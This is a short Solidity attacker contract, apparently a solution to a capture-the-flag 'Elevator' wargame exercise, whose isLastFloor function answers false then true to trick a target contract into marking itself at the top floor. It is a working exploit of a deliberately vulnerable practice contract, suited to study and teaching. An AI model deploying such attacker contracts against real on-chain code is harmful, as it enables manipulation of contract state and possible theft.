pragma solidity >=0.4.22 <0.9.0;
import './Elevator.sol';

contract Exo11 is Building{
    uint256 round = 1;

    Elevator elevator;
    constructor(address payable _targetContract) public {
        elevator =  Elevator(_targetContract);
    }
    function isLastFloor(uint) public override returns(bool){
        if(round == 1){
            round++;
            return false;
        }
        if(round == 2){
            return true;
        }
        else{
            return false;
        }
    }
  
  function execute() public {
      elevator.goTo{gas: 4000000}(5);
  }


}  
